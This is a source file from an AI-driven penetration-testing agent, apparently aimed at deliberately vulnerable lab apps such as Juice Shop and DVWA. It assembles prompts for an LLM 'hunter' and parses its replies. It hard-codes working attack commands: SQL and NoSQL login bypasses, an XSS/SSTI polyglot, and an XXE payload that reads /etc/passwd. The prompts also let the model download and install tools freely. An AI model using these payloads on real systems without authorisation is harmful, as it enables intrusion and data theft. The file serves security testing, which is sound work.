// Split out of huntAgent.js by the P3 professionalization lane (split-only, no behaviour change).
// Moved verbatim; huntAgent.js re-exports the public names so callers are unchanged.

import { pendingChatQuestions, chatQuestionScreenLines, extractChatAnswers, parseChatAnswerLines } from '../chatQueue.js';
import { isErrorPageFinding } from '../huntMemory.js';
import { findWrongTargetPaths } from '../knownApps.js';
import { callBrain } from '../brainProvider.js';
import { generateHypotheses, formatHypothesesForPrompt, scoreInterestingness, buildAppModel, formatAppModelForPrompt } from '../curiosity.js';
import { recordReasoning, formatReasoningForPrompt, formatLedgerForPrompt, getHypothesisLedger, getPremiseLedger, getVerifiedPairs, normalizeHypothesis, getAllReasoning, buildFullHistoryLedger, searchRecall } from '../reasoningMemory.js';
import { recordGlobalLearning, getRelevantMemories, formatGlobalMemoryForPrompt, inferTechnique, readAllGlobalMemories } from '../globalMemory.js';
import { appendHuntEvent, writeHuntMeta, writeHuntMetaCheckpoint, readHuntMeta, readHuntEvents, readUsers, readTargetIntel, writeTargetIntel, huntDir, ensureHuntDir } from '../store.js';
import { episodeLedgerEnabled, retrieveEpisodes, formatRetrievalForPrompt, recordRuledOut, getRuledOutCounts, formatLessonsForPrompt, RETRY_BUDGET, recordFact } from '../episodeStore.js';
import { extractPremise, premiseKey, UNKNOWN_PREMISE_KEY } from '../premiseDedup.js';
import { proposePlaybook, formatPlaybookForPrompt } from '../playbook.js';
import { recordPlanOutcome } from '../planTree.js';
import { humanIteration, defaultDeliverChatAnswer } from '../humanLoop.js';
import {
  generateLogicTests,
  evidenceGate,
  verifyPipeline,
  executionFailed,
  httpErrorStatus,
  evidenceReproduced,
  assessContentRelevance,
  evidenceSignalIds,
  supportingSignalLines,
  extractLinkedAssetUrls,
  beamSearchChains,
  analyzeFindings,
  mineJsEndpoints,
  rankEndpoints,
  blModulesFor,
  classifyTarget,
  scoreWeirdness,
  isWorthInvestigating,
  recordHuntExperience,
  getPlaybook,
  encodePayload,
  ENCODERS,
  fingerprintWaf,
  classifyFinding,
  sweepSiblings,
  buildSweepProbe,
  backfillVerifiedClasses,
} from '../hunt-intel/index.js';
import { extractSignal, extractTestsFromThinking, finding, fnv1aHex, inferAppPurpose, isPaused, isStopped, repairShellQuoting, sanitizeForAI, stripTerminalArtifacts, think, waitWhilePaused } from './text.js';
import { executeWithEvasion } from './exec.js';
import { assessResult } from './verification.js';

/** Phase 2+: Bedrock picks the next test; we execute and verify. */
export async function agentIteration(huntId, target, recon, findings, iteration, playbook) {
  // ERROR-PAGE DEMOTION (27 Oct 2026, 404-verified audit): a "verified"
  // stamp whose evidence is an HTTP error page is not a finding — the
  // count the brain sees, and the count it may quote, excludes it.
  const confirmed = findings.filter((f) => f.verified && !isErrorPageFinding(f));

  // MID-HUNT STEERING: the user can talk to the brain from the frontend.
  // Drain any queued instructions and follow them this iteration.
  let steering = '';
  try {
    const m = readHuntMeta(huntId) || {};
    const queue = Array.isArray(m.steerQueue) ? m.steerQueue : [];
    if (queue.length) {
      steering = queue.map((q) => `- ${q.from}: ${q.message}`).join('\n');
      think(huntId, `Received your instruction — following it this round: ${queue[queue.length - 1].message.slice(0, 120)}`);
      writeHuntMetaCheckpoint(huntId, { steerQueue: [] });
    }
  } catch { /* steering must never break the hunt */ }

  // MID-HUNT CHAT (27 Oct 2026, chat-gate fix): the owner's queued
  // questions used to be answered ONLY by the human loop — in normal
  // mode they sat pending forever (the 21:16 IST question asking what
  // the hunt was doing waited 11 minutes through normal iterations).
  // Read them here, same best-effort pattern as the steering drain,
  // and put them on the screen so the brain answers them this
  // iteration; delivery happens after the reply is parsed, below.
  let pendingChat = [];
  let chatQuestionLines = '';
  try {
    pendingChat = pendingChatQuestions(huntId);
    const lines = chatQuestionScreenLines(pendingChat);
    if (lines.length) chatQuestionLines = `\n${lines.join('\n')}`;
  } catch { /* chat questions must never break the hunt */ }

  // Playbook: what worked on similar targets before?
  const lessons = (playbook || []).slice(0, 3).map((l) => `- ${l.technique}: ${l.why}`).join('\n');

  // CURIOSITY ENGINE: generate hypotheses from recent observations.
  // A human hacker follows interesting threads, not just a checklist.
  let curiositySection = '';
  try {
    const recentEvents = readHuntEvents(huntId).slice(-20);
    const observations = recentEvents
      .filter((e) => e.type === 'tool_call' || e.type === 'thinking')
      .map((e) => ({ output: e.output || e.text || '', duration: e.duration }));
    const hypotheses = generateHypotheses(observations, recon);
    curiositySection = formatHypothesesForPrompt(hypotheses);
    if (curiositySection) {
      think(huntId, `Curiosity: pursuing ${hypotheses.length} interesting threads`);
    }
  } catch { /* curiosity must never break the hunt */ }

  // CONTEXT BUDGETING: the prompt must fit inside the model's real context
  // window (OLLAMA_NUM_CTX — 2048 on the 7GB EC2 box, lowered 16 Oct 2026 to
  // stop OOM kills). A prompt longer than num_ctx makes Ollama return
  // HTTP 500, which the hunt reads as "model gave no reply" and eventually
  // pauses with ai_no_reply. So the budget is derived from the actual
  // num_ctx minus the output budget, not from a hardcoded assumption.
  // Priority: target intelligence > confirmed findings > lessons > endpoints.
  const NUM_CTX = parseInt(process.env.OLLAMA_NUM_CTX || '2048', 10);
  const NUM_PREDICT = parseInt(process.env.OLLAMA_NUM_PREDICT || '600', 10);
  // ~3.5 chars per token (conservative for URLs/JSON/code); reserve the
  // output budget plus a 200-token safety margin.
  const MAX_PROMPT_CHARS = Math.max(2000, Math.floor((NUM_CTX - NUM_PREDICT - 200) * 3.5));
  const MAX_INTEL_CHARS = Math.max(500, Math.floor(MAX_PROMPT_CHARS / 5));
  const intel = recon.intelligentPrompt
    ? `\n--- TARGET INTELLIGENCE (follow strictly) ---\n${String(recon.intelligentPrompt).slice(0, MAX_INTEL_CHARS)}`
    : '';
  // HIGH-VALUE TARGETS: authentication endpoints are the #1 priority for
  // elite hunters. If the recon found login/auth endpoints, flag them
  // explicitly — the model often overlooks them among generic endpoints.
  const authEndpoints = (recon.endpoints || []).filter((ep) =>
    /login|auth|signin|session|token/i.test(ep)
  );
  const authHint = authEndpoints.length
    ? `\nHIGH-VALUE TARGETS (test FIRST): ${authEndpoints.slice(0, 5).join(', ')} — these are authentication endpoints. Try SQL injection, NoSQL injection, and authentication bypass on them before anything else.`
    : '';
  const context = [
    `Target: ${target}`,
    `Profile: ${recon.profile}`,
    `Open ports: ${(recon.ports || []).map((p) => `${p.port}/${p.service}`).join(', ') || 'none found'}`,
    `Endpoints: ${recon.endpoints.slice(0, 15).join(', ') || 'none mined'}`,
    authHint,
    `Confirmed findings so far: ${confirmed.length}`,
    ...confirmed.slice(-5).map((f) => `- ${f.title} (${f.severity})`),
    `A finding counts as verified only if its proof response was a real page (HTTP 200-class) — an error page (404/500) is never proof. Do not quote a verified count you have not earned.`,
    chatQuestionLines,
    lessons ? `Past lessons for similar targets:\n${lessons}` : '',
    // INTELLIGENT CONTEXT: tech detection tells AI what NOT to try
    // (e.g., never suggest SQLi on a MongoDB target)
    intel,
    // LONG-TERM MEMORY: what past hunts learned about THIS target
    recon.pastIntel && recon.pastIntel.huntCount > 0
      ? `\n--- MEMORY OF PAST HUNTS ON THIS TARGET (${recon.pastIntel.huntCount} hunts) ---\n` +
        `Past technologies: ${(recon.pastTechnologies || []).join(', ') || 'unknown'}\n` +
        `Past findings: ${(recon.pastIntel.findings || []).slice(-5).map((f) => `${f.title} (${f.severity})`).join('; ') || 'none'}\n` +
        `Do NOT repeat tests that already failed here — try new angles.`
      : '',
  ].join('\n').slice(0, MAX_PROMPT_CHARS);

  // HUMAN MENTAL MODEL: what does this app DO? A human hunter spends the first
  // 2 minutes understanding the app, not running scans. Build that model here.
  let appModelSection = '';
  // GLOBAL MEMORY (19 Oct 2026): the target's fingerprint (app type + tech
  // stack) is captured here so (a) the read path can fetch relevant
  // cross-hunt lessons for the prompt, and (b) the write path in
  // assessResult (which has no recon) can attribute findings via hunt meta.
  let appFingerprint = { appType: 'unknown', techStack: [] };
  try {
    const appModel = buildAppModel(recon.endpoints || [], recon.detection?.techs || [], recon.profile || '', recon.knownApp || null);
    appModelSection = formatAppModelForPrompt(appModel);
    appFingerprint = {
      appType: appModel.appType || 'unknown',
      techStack: (recon.detection?.techs || []).slice(0, 8),
    };
    if (appModel.appType !== 'unknown') {
      think(huntId, `App model: looks like ${appModel.appType} — value flows: ${appModel.valueFlows.slice(0, 2).join('; ').slice(0, 100)}`);
    }
  } catch { /* app model is best-effort */ }

  // GLOBAL MEMORY read: lessons from ALL past hunts, relevance-scored
  // against this target's fingerprint. Additive to the per-hunt reasoning
  // history — capped hard so it never blows the context budget.
  let globalMemorySection = '';
  let globalMemoryAudit = { count: 0, keys: [], sectionLen: 0, sectionHash: 'empty' };
  try {
    // HUMAN-BRAIN (26 Oct 2026, per-hunt isolation): the target is
    // passed so another target's endpoint-specific lessons are
    // reduced to their technique rate before they reach the prompt.
    const relevantMemories = getRelevantMemories(appFingerprint, 12, { target });
    // Cap raised 500 → 2000 (solver #443): with the widened context window
    // the cross-hunt lessons no longer need to be squeezed to a stub.
    globalMemorySection = formatGlobalMemoryForPrompt(relevantMemories).slice(0, 2000);
    globalMemoryAudit = {
      count: relevantMemories.length,
      keys: relevantMemories.map((m) => `${m.type}|${m.technique}|${m.appType}`),
      sectionLen: globalMemorySection.length,
      sectionHash: fnv1aHex(globalMemorySection),
    };
  } catch { /* global memory is best-effort */ }
  // PROMPT AUDIT (19 Oct 2026): prompts are never stored (context budget),
  // so influence claims were unverifiable. This lightweight record — which
  // memories reached the model, how long the section was, a content hash —
  // lets future audits answer "did iteration N see memory X?" with evidence.
  // Direct appendHuntEvent (not think()): machine audit trail, not the model's voice.
  try {
    appendHuntEvent(huntId, { type: 'memory_audit', iteration, ...globalMemoryAudit });
  } catch { /* best-effort */ }
  // Stash the fingerprint on the hunt meta for the write path.
  try {
    const m0 = readHuntMeta(huntId) || {};
    if (JSON.stringify(m0.appFingerprint || null) !== JSON.stringify(appFingerprint)) {
      writeHuntMetaCheckpoint(huntId, { appFingerprint });
    }
  } catch { /* best-effort */ }

  // RETRIEVED MEMORY (Job 6 stage 2): hybrid retrieval over the episode
  // ledger, scored entirely by code (FTS + embedding cosine + rule
  // importance + recency + entity boost — zero LLM calls in scoring). The
  // query is this hunt's live context: target, app fingerprint, and the
  // most recent reasoning step. The slice rides at the very END of the
  // prompt (the recency position — research: context rot hits the middle
  // hardest), and its size is subtracted from the full-history budget so
  // the total prompt stays within the hard cap.
  let retrievedSection = '';
  let retrievalStats = { hits: 0, top: 0 };
  try {
    if (episodeLedgerEnabled()) {
      const lastReasoning = getAllReasoning(huntId).slice(-1)[0] || {};
      const retrievalQuery = [
        target,
        appFingerprint.appType || '',
        ...(appFingerprint.techStack || []),
        lastReasoning.hypothesis || '',
        lastReasoning.action || '',
      ].join(' ').slice(0, 300);
      const ret = await retrieveEpisodes(retrievalQuery, { huntId, crossHunt: true, limit: 6 });
      if (ret.results.length) {
        retrievedSection = formatRetrievalForPrompt(ret.results, { budgetChars: 4200, query: retrievalQuery });
        retrievalStats = { hits: ret.results.length, top: Number(ret.results[0].score.toFixed(2)) };
      }
    }
  } catch { /* retrieval is best-effort */ }

  // FULL HISTORY (20 Oct 2026, solver #443 — owner order: "he knows
  // everything he did before"): the COMPLETE ledger of this hunt joins the
  // protected post-header zone — every finding (never dropped), captured
  // artifacts, dead ends, and one line per executed action from
  // reasoning.jsonl. Only the oldest action lines are ever compressed, and
  // only into counts-by-outcome (see buildFullHistoryLedger).
  let fullHistorySection = '';
  let fullHistoryStats = { actions: 0, shown: 0, summarised: 0, findings: 0, verified: 0, deadEnds: 0 };
  try {
    const metaNow = readHuntMeta(huntId) || {};
    const built = buildFullHistoryLedger({
      reasoningRows: getAllReasoning(huntId),
      findings: readHuntEvents(huntId).filter((e) => e.type === 'finding'),
      chainContext: metaNow.chainContext || null,
      budgetChars: Math.max(3000, MAX_PROMPT_CHARS - 12000 - retrievedSection.length),
      knownApp: recon.knownApp || null,
    });
    fullHistorySection = built.text;
    fullHistoryStats = built.stats;
  } catch { /* full history is best-effort */ }
  // RECALLED MEMORY: the model's most recent RECALL:<query> result, stashed
  // on the hunt meta by the RECALL handler in executeWithEvasion, rides the
  // next planning prompts until a newer recall replaces it.
  let recalledSection = '';
  try {
    const mR = readHuntMeta(huntId) || {};
    if (mR.recallSection && mR.recallSection.text) {
      recalledSection = `\n--- RECALLED MEMORY (you asked to recall: "${String(mR.recallSection.query).slice(0, 120)}") ---\n${String(mR.recallSection.text).slice(0, 3000)}`;
    }
  } catch { /* recall is best-effort */ }

  // HARD CAP on the final prompt: the instruction header plus context plus
  // trailing sections (steering, curiosity) must together fit in the model's
  // context window. Anything beyond the budget is cut from the end, where
  // the lowest-priority sections live.
  // NOTE: the reasoning history sits right after the header on purpose.
  // A controlled experiment (Oct 2026) proved the model changes its plans
  // based on this history — it avoids re-testing attacks the history says
  // failed. Placing it last meant it was the FIRST section truncated when
  // the prompt exceeded budget, silently disabling the learning mechanism
  // in exactly the fully-loaded hunts where it matters most.
  // OWNER ORDER 1 Nov 2026: NO pre-written plan. The brain decides FRESH every
  // turn from memory + live observation — never from a seeded checklist.
  // (planTree.js kept for recordPlanOutcome only; seeding/render removed.)
  const prompt = [
    'You are an ELITE bug-bounty hunter. You think like a HUMAN, not a scanner.',
    '',
    'HOW YOU THINK:',
    '- First UNDERSTAND the app: what does it do? Where does money/data/trust flow?',
    '- Then OBSERVE: what looks odd, interesting, or out of place?',
    '- Then WONDER: "what if I..." — follow your curiosity, not a checklist.',
    '- A scanner runs test 1, then test 2, then test 3. YOU follow interesting threads.',
    '- If a response shows a price, ask who controls it. If you see an ID, ask whose it is.',
    '- Think about what the DEVELOPER assumed — then break that assumption.',
    '- Business logic flaws (wrong price, wrong user, skipped steps) pay the best bounties.',
    '',
    'Look at the app model, your notebook, and the recon below.',
    'What catches your EYE? What would you poke at next, and WHY?',
    'Propose up to THREE probes — but they should feel like YOUR ideas, not a checklist.',
    'Reply as a JSON array: [{"test":"name","command":"shell command","why":"one line (your reasoning)","hypothesis":"what you expect to find"}, ...].',
    'Commands must be non-destructive and target-scoped. You can use: nmap, nuclei, curl, python3, and any tools in the container.',
    'You are a PERSON with a machine, not a script. If you need a tool you don\'t have, download it (curl/wget) or install it (apt-get). If you don\'t know something, SEARCH the web: put "SEARCH: your question" as the command and you\'ll get web results back.',
    'REMEMBER LIKE A HUMAN: your FULL HISTORY below is everything you have done this hunt. If you need the DETAIL of any past action, finding, or cross-hunt lesson, RECALL it: put "RECALL: keywords" (a technique, endpoint, or error) as the command and the matching records from this hunt and all past hunts come back to you.',
    'GROW YOUR PLAYBOOK: when a technique proves itself, propose it as a command: "PROPOSE_PLAYBOOK: the rule, in one line". Proposals become permanent playbook rules only after a validator-confirmed success — unproven ideas stay proposals.',
    'YOUR WORKSPACE IS UNLIMITED — your context is not: for anything long (a script, a payload list, notes), write it to a FILE in your hunt workspace instead of pasting it into a command. Command "WRITE_ARTIFACT: name.sh" on the first line, then the file content, creates it; "APPEND_ARTIFACT: name.sh" plus a chunk adds more (build big files over several replies); "RUN_ARTIFACT: name.sh" executes it by path; "READ_ARTIFACT: name.sh" (optionally "READ_ARTIFACT: name.sh 4000:8000") reads any part back. Artifacts are permanent and full-length. Large tool outputs are likewise saved whole as artifacts — the note in your history gives the name, READ_ARTIFACT brings back any slice. Keep single shell commands short; put length in files.',
    'BUILD WHAT YOU NEED: If no existing tool does what you want, WRITE IT. You have python3 and bash — an elite hunter writes a custom script mid-hunt instead of giving up. Put your script in the command field (python3 -c "..." or a heredoc). Think "I need this, so I create this."',
    'CRITICAL: Respect the TARGET INTELLIGENCE section — never suggest tests for technologies not present.',
    '',
    formatReasoningForPrompt(huntId),
    // HYPOTHESIS LEDGER (19 Oct 2026, solver #127): hard ban list of closed
    // leads — verified hypotheses (no same-instance re-testing; variant sweeps
    // only) and dead hypotheses (failed 5+ times — forced pivot, logged to
    // reasoning.jsonl). Sits in the protected post-header zone with the
    // reasoning history so truncation never cuts it first.
    formatLedgerForPrompt(huntId),
    // LESSONS FROM FAILURES (Job 6 stage 4): validator-written lessons +
    // ruled-out instances, in the protected zone beside the ledger.
    formatLessonsForPrompt(huntId),
    // PLAYBOOK + SKILLS (Job 6 stage 5): rules earned by verified
    // successes, plus at most 5 fingerprint-matched skill guides.
    formatPlaybookForPrompt({ appType: appFingerprint.appType, techStack: appFingerprint.techStack, query: target }),
    // PLAN TREE removed 1 Nov 2026 (owner order): no pre-written checklist in
    // the prompt — the brain decides fresh every turn from memory + observation.
    fullHistorySection,
    globalMemorySection,
    recalledSection,
    '',
    appModelSection,
    '',
    context,
    '',
    `Iteration ${iteration} — hunting unlimited.`,
    steering ? `\n--- USER INSTRUCTION (follow this round) ---\n${steering}` : '',
    curiositySection,
    // Retrieved memory goes LAST (recency position) — see stage-2 note above.
    retrievedSection,
  ].join('\n').slice(0, MAX_PROMPT_CHARS);

  // BRIEFING AUDIT (solver #443): prompts are not stored, so prove the
  // full-history briefing actually reached the model — sizes and coverage
  // counts, every iteration, in the hunt's own event stream.
  try {
    think(huntId, `Briefing: prompt ${prompt.length} chars — full history: ${fullHistoryStats.actions} actions (${fullHistoryStats.summarised} oldest summarised), ${fullHistoryStats.findings} findings (${fullHistoryStats.verified} verified), ${fullHistoryStats.deadEnds} dead ends; global memory: ${globalMemoryAudit.count} lessons; retrieved memory: ${retrievalStats.hits} episodes (top score ${retrievalStats.top}).`);
  } catch { /* best-effort */ }

  let plans = [];
  // NOTE: `reply` is hoisted out of the try block on purpose — the
  // natural-language fallback below needs it when the model replied but
  // produced no parseable JSON. Declaring it as `const` inside the try
  // threw "ReferenceError: reply is not defined" and silently discarded
  // the model's plan (seen live on h_bench_cb6e37b2 iteration 1).
  let reply = '';
  // MID-HUNT CHAT (27 Oct 2026): when owner questions are pending, the
  // brain answers them AFTER the plans array, one CHAT_ANSWER line per
  // question — the array parser tolerates trailing lines, so the plans
  // still parse. No questions pending: the strict array-only contract.
  const systemPrompt = pendingChat.length
    ? 'You are an elite bug-bounty hunter. Output the requested JSON array first; after it, answer the owner questions listed in the context, one per line: CHAT_ANSWER <question-id>: <your answer in the user\'s language>. No other prose.'
    : 'You are an elite bug-bounty hunter. Output ONLY the requested JSON array, no prose.';
  try {
    reply = await callBrain(
      [{ role: 'user', text: prompt }],
      systemPrompt,
      { huntId },
      { huntId }
    );
    if (!reply) {
      think(huntId, 'Model gave no reply this iteration — skipping to next.');
      return { aiOk: false, best: null, failKind: 'no_reply' };
    }
    // Record the model's raw reply IN FULL (solver #459 — full-fidelity
    // record; the terminal/UI may truncate at render, the log never does).
    think(huntId, `model raw plan: ${String(reply)}`);
    // TRUNCATION-TOLERANT: The 8B model is often cut off by the 300-token
    // output limit, losing the closing `]`. Try the complete array first;
    // if the bracket is missing, match the open array so the repair below
    // can salvage complete plan objects instead of discarding the reply.
    // (Root cause of the ai_bad_output death loop: the repair was unreachable
    // when truncation removed the `]` — 38 raw plans with 0 repairs on
    // h_bench_ada457c3.)
    const m = /\[\s*\{[\s\S]*\]/.exec(reply) || /\[\s*\{[\s\S]*/.exec(reply);
    if (m) {
      try {
        plans = JSON.parse(m[0]);
      } catch {
        // REPAIR: the model often gets cut off mid-JSON (token limit) or
        // leaves a trailing comma. Salvage complete plan objects instead of
        // discarding the whole reply.
        plans = [];
        const objRe = /\{[^{}]*"test"\s*:\s*"[^"]*"\s*,\s*"command"\s*:\s*"[^"]*"(?:\s*,\s*"why"\s*:\s*"[^"]*")?(?:\s*,\s*"hypothesis"\s*:\s*"[^"]*")?\s*\}/g;
        let om;
        while ((om = objRe.exec(m[0])) !== null) {
          try {
            const p = JSON.parse(om[0]);
            if (p.test && p.command) plans.push(p);
          } catch { /* skip that object */ }
        }
        if (plans.length) think(huntId, `Repaired ${plans.length} plan(s) from truncated JSON.`);
      }
    }
  } catch (err) {
    think(huntId, `AI call threw: ${err && err.message ? String(err.message).slice(0, 200) : err}`);
    return { aiOk: false, best: null, failKind: 'error' };
  }
  // MID-HUNT CHAT DELIVERY (27 Oct 2026, chat-gate fix): the brain's
  // answers ride after the plans array as CHAT_ANSWER <id>: <answer>
  // lines. Delivered before any plan executes — a blocked plan must
  // never swallow the owner's answer. Best-effort, mirroring the
  // human loop's delivery (humanLoop.js).
  try {
    if (pendingChat.length && reply) {
      const parsedAnswers = parseChatAnswerLines(reply).map(({ q, answer }) => ({ q, answer }));
      const answers = extractChatAnswers({ chat_answers: parsedAnswers }, pendingChat);
      for (const a of answers) {
        try { await defaultDeliverChatAnswer(huntId, a, { via: 'normal-mode' }); } catch { /* one failed delivery never blocks the rest */ }
      }
    }
  } catch { /* chat answers are best-effort — the plans still run */ }
  // MANDATORY AUTH TESTS: If recon found login/auth endpoints and the model's
  // plans don't include them, prepend deterministic injection tests. The model
  // often overlooks auth; an elite hunter NEVER skips the login form.
  // This is not a suggestion — it's a mandatory first step.
  // FIX (19 Oct 2026, solver #9): This block MUST run BEFORE the !plans.length
  // early-return below. Previously, when the model produced no usable plans
  // (no reply / bad JSON), the function returned 'bad_output' and the mandatory
  // SQLi test never fired — the deterministic safety net only worked when the
  // model cooperated. An elite hunter tests the login form even when inspiration
  // fails; the mandatory tests are independent of model output.
  try {
    // APP-AWARE LOGIN (zero-genuine lane): the mandatory login tests
    // must hit THIS app's real login endpoint. On DVWA the endpoint
    // is /login.php (a form-encoded PHP login) — the old code only
    // accepted /api|rest|... paths and posted a Juice Shop JSON body
    // to /rest/user/login, so every "SQLi on login" failure on DVWA
    // was a 404 against the wrong app, and the DOSSIER retired the
    // premise as DEAD. No NoSQL test on DVWA: it is MySQL, not MongoDB.
    const baseUrl = target.replace(/\/$/, '');
    const isDvwa = recon.knownApp === 'dvwa';
    const plansMentionAuth = plans.some((p) => {
      const text = `${p.test || ''} ${p.command || ''}`;
      // FIX (19 Oct 2026, solver #7): The old /login|auth|signin/ regex was too broad —
      // "authorization bypass" contains "auth" as a substring, suppressing the mandatory
      // login tests even though the model's plan doesn't actually test the login form.
      // Only suppress if the model targets a real login endpoint.
      return isDvwa
        ? /login\.php/i.test(text)
        : /\/rest\/user\/login|\/api\/[^"'\s]*login|signin/i.test(text);
    });
    if (!plansMentionAuth) {
      if (isDvwa) {
        plans.unshift({
          test: 'SQLi authentication bypass on login',
          command: `curl -sk -X POST "${baseUrl}/login.php" -d "username=admin' OR '1'='1&password=x&Login=Login" | head -c 2000`,
          why: 'Classic SQL injection in the DVWA login form (MySQL) — tests if authentication can be bypassed',
          hypothesis: 'Login endpoint may be vulnerable to SQL injection',
        });
        think(huntId, 'Mandatory auth tests injected for /login.php (model overlooked auth)');
      } else {
        const authEndpoints = (recon.endpoints || []).filter((ep) =>
          /login|auth|signin|session|token/i.test(ep)
        // FIX (19 Oct 2026, solver #6): Validate endpoint is a real path, not a
        // terminal artifact. Recon from older hunts may contain MOTD lines (e.g.,
        // '┗━(Run: "touch ~/.hushlogin"...)' matched /login/ via "hushlogin",
        // corrupting the SQLi test URL). Only accept path-like endpoints.
        ).filter((ep) => /^\/(api|rest|v\d+|admin|graphql|internal)/.test(ep.trim()));
        if (authEndpoints.length) {
          // FIX (19 Oct 2026, solver #7): Prefer the actual login endpoint, not just
          // the first auth-matching endpoint. /rest/user/authentication-details/
          // matches /auth/ but it's not the login form — the SQLi payload needs
          // the real login endpoint to work.
          const loginEp = authEndpoints.find((ep) => /\/login\/?$/i.test(ep.trim())) ||
                          authEndpoints.find((ep) => /signin/i.test(ep)) ||
                          authEndpoints[0];
          const authTests = [
            {
              test: 'SQLi authentication bypass on login',
              command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`,
              why: 'Classic SQL injection in login — tests if authentication can be bypassed',
              hypothesis: 'Login endpoint may be vulnerable to SQL injection',
            },
            {
              test: 'NoSQL injection on login',
              command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 2000`,
              why: 'NoSQL injection bypass — tests for MongoDB-style auth flaws',
              hypothesis: 'Login may use NoSQL backend vulnerable to operator injection',
            },
          ];
          plans.unshift(...authTests);
          think(huntId, `Mandatory auth tests injected for ${loginEp} (model overlooked auth)`);
        }
      }
    }
  } catch { /* mandatory tests are best-effort */ }

  // MANDATORY DIVERSITY TESTS (19 Oct 2026, solver #102): An elite hunter never
  // tests just one vuln class. The agent found SQLi via the mandatory auth net
  // but kept re-verifying it instead of diversifying. This block injects probes
  // for OTHER vuln classes grounded in recon-discovered endpoints — XSS on
  // search, business-logic on basket, IDOR on basket. All go through the same
  // assessResult pipeline; validators are NOT loosened.
  // DIVERSITY probe execution guarantee — per-hunt record of which
  // hand-verified deterministic probes have already run (persisted to
  // meta.json so a restart doesn't re-fire them).
  let detFrontProbes = [];
  const detRun = new Set(((readHuntMeta(huntId) || {}).deterministicProbesRun) || []);
  try {
    const eps = (recon.endpoints || []).map((e) => String(e).trim());
    const baseUrl = target.replace(/\/$/, '');
    const plansMention = (re) => plans.some((p) => re.test(`${p.test || ''} ${p.command || ''}`));
    const diversityTests = [];
    // Deterministic probes (hand-verified, safe read-only) go to the FRONT
    // of the execution window exactly once per hunt — see the guarantee block
    // after the chain-pursuit injection below.
    const detFront = [];

    // 1. XSS on search endpoints — search is the classic reflected-XSS sink.
    // Also carries an SSTI polyglot ({{7*7}}): if the backend renders the
    // query through a template engine, the response contains "49".
    const searchEp = eps.find((e) => /search/i.test(e) && /^\/(api|rest)/.test(e));
    if (searchEp && !plansMention(/xss|cross.?site|<script/i) && !detRun.has('ssti-polyglot-search')) {
      detFront.push({
        detId: 'ssti-polyglot-search',
        test: 'Reflected XSS + SSTI polyglot on search',
        command: `curl -sk "${baseUrl}${searchEp}?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E%7B%7B7*7%7D%7D" | head -c 2000`,
        why: 'Search endpoints often reflect input unsanitised — classic reflected XSS; the {{7*7}} polyglot also flags server-side template injection if the response contains 49',
        hypothesis: 'Search query parameter may reflect without encoding or pass through a template engine',
      });
    }

    // 1b. XXE on deprecated /file-upload — external entity resolution.
    // CORRECTION (19 Oct 2026, solver #129): solver #124's NOTE dismissed
    // XXE as "vector absent" (claimed /file-upload returns 410 and "the echo
    // does not resolve entities"). Re-verified live against the CURRENT lab
    // container (v17.3.0): /file-upload returns 400 (not 410), and the error
    // page reflects the parsed XML body WITH external entities RESOLVED —
    // confirmed 3x with payload-foreign strings (/etc/passwd -> "root:" in
    // the error response, /etc/os-release -> PRETTY_NAME="Distroless"; the
    // benign-XML control shows zero signal). /b2b/v2/orders upload needs
    // auth (401) and is NOT the vector; the deprecated /file-upload path is.
    // Juice-Shop-lab-specific (same precedent as the /ftp probe below).
    // v2 (19 Oct 2026, elite-gap cycle): v1's self-label ("XXE CONFIRMED ...
    // disclosed ...") matched NONE of assessResult's triage signals —
    // driver-tested against the REAL pipeline code: weird=20 (<40) and the
    // interesting/payload_validation regexes have no "confirmed"/"disclosed"
    // alternative, so a perfect v1 execution was SILENTLY DISCARDED
    // (assessResult null); extractSignal was also empty, so
    // exploit_confirmation could never pass. v2 speaks the pipeline's
    // vocabulary honestly: "VULNERABLE" + "EXPOSED" (both triage keywords)
    // and the label carries the genuinely observed "root:x:0:0" fragment
    // (gated on grep -q 'root:') so extractSignal yields 'cmd-exec' and the
    // re-run confirmation compares equal. New detId per the premise-version
    // rule — v1's once-per-hunt flag is spent on the non-converting label.
    // Command kept under the 500-char driver cap (419 chars, solver #126
    // lesson). Validators, gates, and assessResult untouched.
    if (!plansMention(/xxe|external.?entity/i) && !detRun.has('xxe-fileupload-error-v2')) {
      detFront.push({
        detId: 'xxe-fileupload-error-v2',
        test: 'XXE external-entity file disclosure on /file-upload',
        command: `R=$(printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/passwd">]><r>&c;</r>' >/tmp/xe.xml; curl -sk -X POST -F "file=@/tmp/xe.xml" "${baseUrl}/file-upload"); echo "$R"|grep -q 'root:' && echo 'XXE VULNERABLE: external entity resolved - /etc/passwd disclosed (root:x:0:0) EXPOSED in error response WITHOUT authentication' || echo 'not vulnerable: entity not resolved'; rm -f /tmp/xe.xml`,
        why: 'Deprecated /file-upload parses uploaded XML with external entities resolved; /etc/passwd content appears in the unauthenticated error response - error-based XXE file disclosure',
        hypothesis: 'Deprecated /file-upload endpoint may resolve XML external entities and disclose server files in error responses',
      });
    }

    // 2. Business logic: price manipulation in basket. An elite hunter asks
    // "can I change the price?" — this is a READ-ONLY probe (fetch basket,
    // look for price fields client can influence). No purchase is attempted.
    const basketEp = eps.find((e) => /\/basket\/?$/i.test(e));
    if (basketEp && !plansMention(/price|basket.*manipulat|business.?logic/i)) {
      diversityTests.push({
        test: 'Basket price field exposure',
        command: `curl -sk "${baseUrl}${basketEp}" -H "Content-Type: application/json" | head -c 2000`,
        why: 'Basket responses often expose price/total fields — if client-controllable, price manipulation is possible',
        hypothesis: 'Basket API may expose price fields that influence checkout total',
      });
    }

    // 3. IDOR on basket — can we see another basket by guessing an ID?
    // SAFE: uses a non-existent ID (99999); a 200 with data = IDOR signal,
    // 404/401/empty = not vulnerable. No real user data is targeted.
    if (basketEp && !plansMention(/idor|insecure direct|other.*basket/i)) {
      diversityTests.push({
        test: 'IDOR probe on basket',
        command: `curl -sk "${baseUrl}${basketEp}/99999" | head -c 2000`,
        why: 'Basket IDs are often sequential — testing if another basket is accessible',
        hypothesis: 'Basket endpoint may lack object-level authorisation',
      });
    }

    // 4. Sensitive-file exposure via /ftp — Juice Shop (the lab target)
    // ships an UNAUTHENTICATED /ftp directory listing and the sensitive
